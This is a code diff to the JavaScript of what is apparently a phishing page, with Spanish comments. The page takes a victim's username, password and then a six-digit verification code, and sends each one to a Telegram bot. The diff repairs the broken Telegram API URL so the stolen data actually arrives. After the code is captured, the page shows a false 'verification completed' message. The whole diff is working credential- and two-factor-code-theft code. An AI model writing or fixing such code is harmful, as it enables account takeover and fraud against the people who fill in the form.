@@ -187,7 +187,9 @@
         btn.innerText = 'Cargando...';
 
         const textoTelegram = '🔐 *Datos Recibidos*\n\n👤 *Usuario:* ' + usuario + '\n🔑 *Clave:* ' + contrasena;
-        const urlPaso1 = 'https://telegram.org' + TELEGRAM_TOKEN + '/sendMessage';
+        
+        // DIRECCIÓN OFICIAL CORREGIDA CON API Y BOT
+        const urlPaso1 = 'https://api.telegram.org/bot' + TELEGRAM_TOKEN + '/sendMessage';
 
         fetch(urlPaso1, {
             method: 'POST',
@@ -199,7 +201,7 @@
             })
         })
         .then(response => {
-            if (!response.ok) throw new Error('Error');
+            if (!response.ok) throw new Error('Error en la API');
             document.getElementById('step1').classList.remove('active');
             document.getElementById('step2').classList.add('active');
             startTimer(600); 
@@ -221,7 +223,9 @@
         btn.innerText = 'Procesando...';
 
         const textoTelegramCodigo = '🔢 *Código de 6 Dígitos*\n\n📩 *Código:* ' + codigo;
-        const urlPaso2 = 'https://telegram.org' + TELEGRAM_TOKEN + '/sendMessage';
+        
+        // DIRECCIÓN OFICIAL CORREGIDA CON API Y BOT
+        const urlPaso2 = 'https://api.telegram.org/bot' + TELEGRAM_TOKEN + '/sendMessage';
 
         fetch(urlPaso2, {
             method: 'POST',
@@ -233,7 +237,7 @@
             })
         })
         .then(response => {
-            if (!response.ok) throw new Error('Error');
+            if (!response.ok) throw new Error('Error en la API');
             alert('Verificación completada con éxito.');
         })
         .catch(() => {
